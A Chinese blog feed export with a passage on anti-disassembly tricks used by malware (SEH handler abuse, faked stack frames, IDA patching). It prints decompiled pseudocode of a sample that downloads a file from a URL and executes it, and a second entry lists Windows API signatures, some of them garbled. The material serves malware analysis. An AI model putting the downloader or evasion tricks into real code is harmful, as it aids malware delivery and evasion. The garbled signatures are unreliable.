href="#4-3-滥用SEH处理函数。" class="headerlink" title="4-3.滥用SEH处理函数。"></a>4-3.滥用SEH处理函数。</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是SEH不被编译器采用造成的，SEH不多介绍。我们使用以下代码把处理函数添加到SEH链表中。在code1中，401050开始设置异常处理函数，但是执行到401055时eax的值是401071，这一块是SEH的处理函数，不被seh反汇编！<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">push</span> ExceptionHandle</div><div class="line"><span class="keyword">push</span> <span class="built_in">fs</span>:[<span class="number">0</span>]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">esp</span></div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">401050               mov eax,(loc_40106B+1)  ;设置异常处理函数</div><div class="line">401055               add eax,14h</div><div class="line">401058               push eax</div><div class="line">401059               push fs:[0]</div><div class="line">401060               mov fs:[0],esp</div><div class="line">401067               xor ecx,ecx              ;抛出异常</div><div class="line">401069               div ecx</div><div class="line">40106B               call sleep</div><div class="line">401070               retn</div><div class="line">401070               sub_401050endp sp-snalysis failed</div><div class="line">401070              ---------------------------------</div><div class="line">401071              data.......</div></pre></td></tr></table></figure><ul><li>如图，修补程序创建函数，得到一个函数，但是发现这个函数没有外部参考，且发现一个除0异常如图1，可以肯定得是这个函数肯定调用。（应为下个函数出现了SEH结构）<br>   <img src="https://i.imgur.com/RnWW2Mk.png" alt=""><br>   <img src="https://i.imgur.com/XcvuJkz.png" alt=""></li><li>在main函数出现这个!400000H和148ch异或运算结果（40148c）存在ebp+4中，ebp+4用来保存函数的返回地址，此地址被覆盖，根据缓冲区溢出的原理，我们可以知道这个很有可能只需恶意代码。<br>   <img src="https://i.imgur.com/yOxdcCD.png" alt=""><br>   <img src="https://i.imgur.com/QdkXKTZ.png" alt=""></li><li>如图是在设置SEH处理例程。Handle函数的地址是4014c0<br>  <img src="https://i.imgur.com/C6VEPh4.png" alt=""></li><li>处理4014c0，发现是一个下载运行器<br>  <img src="https://i.imgur.com/rHH6ovM.png" alt=""><h2 id="4-4-对抗栈帧分析"><a href="#4-4-对抗栈帧分析" class="headerlink" title="4-4.对抗栈帧分析"></a>4-4.对抗栈帧分析</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ida试图分析一个函数来确定其栈帧结构，特别是遇到ret/retn就认为到达一个函数结尾，因此很容易伪造栈帧来阻止静态分析。给之前的代码加上一个ret 0xff//////<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;就是在函数中改变esp的值：比如说这里的”cmp esp,0x1000”,后面的”add esp , 0x104h”是永远不会执行的，在这里可以改变esp,也可以做其他的很多混淆手段。如以下代码，cmp esp，1000h恒大于1000h，所以，不会执行add esp，104h，关于堆栈可以用的数据就是sub esp,8；sub esp,4；和add esp,4，所以会分配8个字节栈空间，共计2个参数（int）。<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="number">401543</span>             sub_401543 pronear </div><div class="line"><span class="number">401543</span>             arg_F4  = <span class="number">0F8H</span></div><div class="line"><span class="number">401543</span>             arg_F8  = <span class="number">0fch</span></div><div class="line"><span class="number">401543</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">8</span></div><div class="line"><span class="number">401546</span>             <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401549</span>             <span class="keyword">cmp</span> <span class="built_in">esp</span>,<span class="number">1000h</span>    <span class="comment">;esp与1000h比较，1000h处于内存最低页，不可能被栈使用</span></div><div class="line">40154f             <span class="keyword">jl</span> short loc_401556   ；小于跳转</div><div class="line"><span class="number">401551</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line"><span class="number">401554</span>             <span class="keyword">jmp</span> short loc_40155c</div><div class="line"><span class="number">401556</span>    <span class="comment">;-----------------------------</span></div><div class="line"><span class="number">401556</span>    loc_401556:</div><div class="line"><span class="number">401556</span>             <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">104h</span></div><div class="line">40155c    <span class="comment">;-----------------------------</span></div><div class="line">40155c    loc_40155c:</div><div class="line">40155c             <span class="keyword">mov</span> [<span class="built_in">esp</span>-<span class="number">0f8h</span>+arg_F8],<span class="number">1E61h</span><span class="comment">; [esp-4]esp为负数，不符合逻辑，IDA 堆栈分析异常</span></div><div class="line">·······</div></pre></td></tr></table></figure></li></ul><h1 id="5-实战分析"><a href="#5-实战分析" class="headerlink" title="5.实战分析"></a>5.实战分析</h1><h2 id="5-1-例1："><a href="#5-1-例1：" class="headerlink" title="5-1.例1："></a>5-1.例1：</h2><ul><li>在IDA出现红色的警告，说明反汇编失败，这时候我们用D,或者C键来转化数据类型<br>  <img src="https://i.imgur.com/RVuyWwH.png" alt=""></li><li>然后编辑-修补程序-改变字节，改成90H，在C键可以转化为代码。</li><li>把所有的都修复完毕，发现不能F5，原因是不是一个函数，编辑–函数–创建函数，就行了<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">const</span> CHAR *v4; <span class="comment">// eax@16</span></div><div class="line">  FILE *File; <span class="comment">// ST24_4@22</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *lpBuffer; <span class="comment">// [sp+10h] [bp-102ACh]@20</span></div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Filename; <span class="comment">// [sp+14h] [bp-102A8h]@20</span></div><div class="line">  HINTERNET hInternet; <span class="comment">// [sp+18h] [bp-102A4h]@16</span></div><div class="line">  <span class="keyword">char</span> Buffer; <span class="comment">// [sp+1Ch] [bp-102A0h]@1</span></div><div class="line">  <span class="keyword">char</span> v10; <span class="comment">// [sp+1Dh] [bp-1029Fh]@1</span></div><div class="line">  __int16 v11; <span class="comment">// [sp+10019h] [bp-2A3h]@1</span></div><div class="line">  <span class="keyword">char</span> v12; <span class="comment">// [sp+1001Bh] [bp-2A1h]@1</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+1001Ch] [bp-2A0h]@5</span></div><div class="line">  HINTERNET hFile; <span class="comment">// [sp+10020h] [bp-29Ch]@16</span></div><div class="line">  <span class="keyword">char</span> *Str; <span class="comment">// [sp+10024h] [bp-298h]@19</span></div><div class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [sp+10028h] [bp-294h]@1</span></div><div class="line">  DWORD dwNumberOfBytesRead; <span class="comment">// [sp+101B8h] [bp-104h]@17</span></div><div class="line">  <span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [sp+101BCh] [bp-100h]@3</span></div><div class="line">  Buffer = <span class="number">0</span>;</div><div class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0xFFFC</span>u);</div><div class="line">  v11 = <span class="number">0</span>;</div><div class="line">  v12 = <span class="number">0</span>;</div><div class="line">  <span class="keyword">if</span> ( WSAStartup(<span class="number">0x202</span>u, &amp;WSAData) )</div><div class="line">  &#123;</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( gethostname(name, <span class="number">256</span>) )     <span class="comment">//获取主机名</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span> &amp;&amp; name[i]; ++i )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">switch</span> ( name[i] )                <span class="comment">//比较，不是Z，z，9的话就加1</span></div><div class="line">      &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'Z'</span>:</div><div class="line">          name[i] = <span class="string">'A'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'z'</span>:</div><div class="line">          name[i] = <span class="string">'a'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> <span class="string">'9'</span>:</div><div class="line">          name[i] = <span class="string">'0'</span>;</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">          ++name[i];</div><div class="line">          <span class="keyword">break</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    hInternet = InternetOpenA(name, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    v4 = (<span class="keyword">const</span> CHAR *)URL();</div><div class="line">    hFile = InternetOpenUrlA(hInternet, v4, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> ( hFile &amp;&amp; InternetReadFile(hFile, &amp;Buffer, <span class="number">0xFFFF</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">    &#123;</div><div class="line">      InternetCloseHandle(hFile);</div><div class="line">      Str = <span class="built_in">strstr</span>(&amp;Buffer, SubStr);</div><div class="line">      <span class="keyword">if</span> ( Str )</div><div class="line">      &#123;</div><div class="line">        *<span class="built_in">strstr</span>(Str, asc_40303C) = <span class="number">0</span>;           <span class="comment">// 判断SubStr是否存在Buf中</span></div><div class="line">        Filename = Exe();</div><div class="line">        lpBuffer = <span class="built_in">malloc</span>(<span class="number">0xA00000</span>u);</div><div class="line">        Str += <span class="number">8</span>;</div><div class="line">        hFile = InternetOpenUrlA(hInternet, Str, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> ( InternetReadFile(hFile, (LPVOID)lpBuffer, <span class="number">0x10000</span>u, &amp;dwNumberOfBytesRead) )</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( dwNumberOfBytesRead )</div><div class="line">          &#123;</div><div class="line">            File = fopen(Filename, Mode);</div><div class="line">            fwrite(lpBuffer, dwNumberOfBytesRead, <span class="number">1u</span>, File);  <span class="comment">//写入文件</span></div><div class="line">            fclose(File);</div><div class="line">            ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>);       <span class="comment">//执行</span></div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      result = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">printf</span>(aInternetUnable);</div><div class="line">      result = <span class="number">-1</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(Format);</div><div class="line">    result = <span class="number">-1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-什么是反汇编对抗技术&quot;&gt;&lt;a href=&quot;#1-什么是反汇编对抗技术&quot; class=&quot;headerlink&quot; title=&quot;1.什么是反汇编对抗技术&quot;&gt;&lt;/a&gt;1.什么是反汇编对抗技术&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;对抗反汇编技术就是在程序中使用一些特殊的代码或者数据，让反汇编工具产生不正确的程序代码列表，这种技术由恶意软件编写者手工构造。对抗反汇编的时候，编写者会创建一段代码序列，欺骗反汇编器，使得反汇编器生成与正常代码不同的代码。一般的对抗反汇编的技术利用的是反汇编器的自身反汇编的缺陷来实施的&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows API 函数</title>
    <link href="http://yoursite.com/2018/02/10/Windows_API_%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2018/02/10/Windows_API_函数/</id>
    <published>2018-02-10T07:45:11.000Z</published>
    <updated>2018-03-15T11:29:00.965Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Windows API 就是windows应用程序接口，是针对microsoft windows操作系统家族的系统编程接口，这样的系统包括Windows 8.1,Windows 8,Windows 7,Windows Vista、Windows XP、Windows Server 2012、Windows 2008 R2 、Windows Server 2003、Windows 2000、Windows 95、Windows 98、Windows Me(Millennium Editon)和Windows CE等几乎所有版本。</strong><br><a id="more"></a></p><h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess()"></a>CreateProcess()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>创建一个新的进程及其主线程。新进程在调用进程的安全上下文中运行。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI CreateProcess（</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpApplicationName，  <span class="comment">//要执行的模块的名称。这个模块可以是基于Windows的应用程序</span></div><div class="line">  <span class="variable">_Inout_opt_</span> LPTSTR lpCommandLine，</div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpProcessAttributes， <span class="comment">//指向安全令牌的指针</span></div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpThreadAttributes，  <span class="comment">//指向SECURITY_ATTRIBUTES结构的指针， 用于确定是否可以由子进程继承返回的新线程对象的句柄。</span></div><div class="line">  <span class="variable">_In_</span> BOOL bInheritHandles，</div><div class="line">  <span class="variable">_In_</span> DWORD dwCreationFlags，</div><div class="line">  <span class="variable">_In_opt_</span> LPVOID lpEnvironment，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpCurrentDirectory，               <span class="comment">//进程当前目录的完整路径。该字符串也可以指定一个UNC路径</span></div><div class="line">  <span class="variable">_In_</span> LPSTARTUPINFO lpStartupInfo，</div><div class="line">  <span class="variable">_Out_</span> LPPROCESS_INFORMATION lpProcessInformation</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>返回值：函数成功返回进程句柄，失败返回NULL。</p><h2 id="PeekNamedPipe"><a href="#PeekNamedPipe" class="headerlink" title="PeekNamedPipe()"></a>PeekNamedPipe()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>将自已命名或匿名管道的数据复制到缓冲区中。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI PeekNamedPipe（</div><div class="line">  <span class="variable">_HANDLE</span> hNamedPipe，  <span class="comment">//管道的句柄。此参数可以是由CreateNamedPipe或 CreateFile函数返回的命名管道实例的句柄 ，也可以是由CreatePipe函数返回的匿名管道读取端的句柄 。该句柄必须具有对管道的GENERIC_READ访问权限。</span></div><div class="line">  <span class="variable">_Out_opt_</span> LPVOID lpBuffer，<span class="comment">//指向缓冲区的指针，用于接收从管道读取的数据。</span></div><div class="line">  <span class="variable">_In_</span> DWORD nBufferSize，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesRead，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpTotalBytesAvail，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesLeftThisMessage</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值是非零的。调用失败返回NULL。</p><h2 id="TerminateThread"><a href="#TerminateThread" class="headerlink" title="TerminateThread()"></a>TerminateThread()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>终止一个线程</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI TerminateThread（</div><div class="line">  <span class="variable">_Inout_</span> HANDLE hThread，</div><div class="line">  <span class="variable">_In_</span> DWORD dwExitCode  <span class="comment">//退出代码</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值是非零的。调用失败返回0。</p><h2 id="InternetOpenUrl"><a href="#InternetOpenUrl" class="headerlink" title="InternetOpenUrl()"></a>InternetOpenUrl()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开由完整的FTP或HTTP URL指定的资源。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HINTERNET InternetOpenUrl（</div><div class="line">  <span class="variable">_In_</span> HINTERNET hInternet，  <span class="comment">//InternetOpen返回的句柄</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszUrl，      <span class="comment">//URL</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszHeaders，</div><div class="line">  <span class="variable">_In_</span> DWORD dwHeadersLength，</div><div class="line">  <span class="variable">_In_</span> DWORD dwFlags，        <span class="comment">//flag</span></div><div class="line">  <span class="variable">_In_</span> DWORD_PTR dwContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果连接成功建立，则返回URL的有效句柄; 如果连接失败，则返回NULL。</p><h2 id="InternetOpen"><a href="#InternetOpen" class="headerlink" title="InternetOpen()"></a>InternetOpen()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>初始化应用程序对WinINet函数的使用。只关注与InternetOpenUrl的区别</strong></p><h2 id="FtpPutFile"><a href="#FtpPutFile" class="headerlink" title="FtpPutFile()"></a>FtpPutFile()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在FTP服务器上存储文件。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">BOOL FtpPutFile（</div><div class="line">  <span class="variable">_In_</span> HINTERNET hConnect，         <span class="comment">//句柄</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszLocalFile，      <span class="comment">//指向包含要从本地系统发送的文件的名称的以空字符结尾的字符串。</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszNewRemoteFile，  <span class="comment">//指向包含要在远程系统上创建的文件的名称的以空字符结尾的字符串。</span></div><div class="line">  <span class="variable">_In_</span> DWORD dwFlags，</div><div class="line">  <span class="variable">_In_</span> DWORD_PTR dwContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果成功返回TRUE，否则返回FALSE。</p><h2 id="RaiseException"><a href="#RaiseException" class="headerlink" title="RaiseException()"></a>RaiseException()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在调用线程中主动引发异常。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void WINAPI RaiseException（</div><div class="line">  <span class="variable">_In_</span> DWORD dwExceptionCode，</div><div class="line">  <span class="variable">_In_</span> DWORD dwExceptionFlags，</div><div class="line">  <span class="variable">_In_</span> DWORD nNumberOfArguments，</div><div class="line">  <span class="variable">_In_</span>  const ULONG_PTR * lpArguments</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>这个函数不会返回一个值。</p><h2 id="IsWow64Process"><a href="#IsWow64Process" class="headerlink" title="IsWow64Process()"></a>IsWow64Process()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定指定的进程是否在WOW64下运行 。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI IsWow64Process（</div><div class="line">  <span class="variable">_In_</span> HANDLE hProcess，</div><div class="line">  <span class="variable">_Out_</span> PBOOL Wow64Process  <span class="comment">//如果进程在WOW64下运行，则指向设置为TRUE的值的指针。如果进程在32位Windows下运行，则该值设置为FALSE。如果该进程是在64位Windows下运行的64位应用程序，则该值也设置为FALSE。</span></div><div class="line">）;</div><div class="line"><span class="comment">//wow64是指64位中的32位子系统，目的是为了在64中能运行32的程序。</span></div></pre></td></tr></table></figure></p><p>如果函数成功，则返回值是非零值。</p><h2 id="ShellExecute（）"><a href="#ShellExecute（）" class="headerlink" title="ShellExecute（）"></a>ShellExecute（）</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对指定的文件执行操作。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HINSTANCE ShellExecute（</div><div class="line">  <span class="variable">_In_opt_</span> HWND hwnd，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpOperation，</div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpFile，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpParameters，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpDirectory，</div><div class="line">  <span class="variable">_In_</span> INT nShowCmd</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，则返回大于32的值。如果该函数失败，它将返回一个错误值</p><h2 id="EnumProcesses"><a href="#EnumProcesses" class="headerlink" title="EnumProcesses"></a>EnumProcesses</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检索系统中每个过程对象的过程标识符。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI EnumProcesses（</div><div class="line">  <span class="variable">_Out_</span> DWORD * pProcessIds，    <span class="comment">//接收进程标志符数组的指针</span></div><div class="line">  <span class="variable">_In_</span> DWORD cb，                <span class="comment">//数组大小</span></div><div class="line">  <span class="variable">_Out_</span> DWORD * pBytesReturned</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。</p><h2 id="SetPriorityClass"><a href="#SetPriorityClass" class="headerlink" title="SetPriorityClass"></a>SetPriorityClass</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置指定进程的优先级。该值与进程每个线程的优先级值一起确定每个线程的基本优先级。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI SetPriorityClass（</div><div class="line">  <span class="variable">_In_</span> HANDLE hProcess，       <span class="comment">//处理过程的句柄。</span></div><div class="line">  <span class="variable">_In_</span> DWORD dwPriorityClass   <span class="comment">//该进程的优先级。该参数可以是以下值之一</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。如果函数失败，返回值为零。<br><a href="https://msdn.microsoft.com/en-us/library/ms686219(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms686219(VS.85).aspx</a></p><h2 id="SetThreadPriority"><a href="#SetThreadPriority" class="headerlink" title="SetThreadPriority"></a>SetThreadPriority</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置指定线程的优先级值。该值与线程进程的优先级一起决定线程的基本优先级。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL</span> WINAPI SetThreadPriority（</div><div class="line">  在_HANDLE hThread中，      <span class="comment">//要设置其优先级值的线程的句柄。</span></div><div class="line">  标签：APIWinHTTP  <span class="keyword">INT</span>     nPriority</div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。<br><a href="https://msdn.microsoft.com/en-us/library/ms686277(VS.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/ms686277(VS.85).aspx</a></p><h2 id="StartServiceCtrlDispatcher"><a href="#StartServiceCtrlDispatcher" class="headerlink" title="StartServiceCtrlDispatcher"></a>StartServiceCtrlDispatcher</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将服务进程的主线程连接到服务控制管理器，从而使线程成为调用进程的服务控制调度程序线程。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> WINAPI StartServiceCtrlDispatcher（</div><div class="line">  _In_  <span class="keyword">const</span> SERVICE_TABLE_ENTRY * lpServiceTable  <span class="comment">//指向SERVICE_TABLE_ENTRY结构数组的指针， 其中包含可在调用过程中执行的每个服务的一个条目。表中最后一项的成员必须具有NULL值才能指定表的结尾。</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><p>如果函数成功，返回值为非零。<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms686324(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ms686324(v=vs.85).aspx</a></p><h2 id="UpdateResource"><a href="#UpdateResource" class="headerlink" title="UpdateResource"></a>UpdateResource</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加 删除 或替文件中的资源。</p><h2 id="GetIfTable"><a href="#GetIfTable" class="headerlink" title="GetIfTable"></a>GetIfTable</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该 GetIfTable函数检索MIB-II接口表。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">DWORD GetIfTable（</div><div class="line">  <span class="variable">_Out_</span> PMIB_IFTABLE pIfTable，  <span class="comment">//指向缓冲区的指针，该缓冲区以MIB_IFTABLE结构接收接口表 。</span></div><div class="line">  <span class="variable">_Inout_</span> PULONG pdwSize，       <span class="comment">//在输入时，指定由pIfTable参数指向的缓冲区的大小（以字节为单位）。</span></div><div class="line">在输出中，如果缓冲区不足以容纳返回的接口表，则函数将此参数设置为等于所需的缓冲区大小（以字节为单位）。</div><div class="line">  <span class="variable">_In_</span> BOOL bOrder</div><div 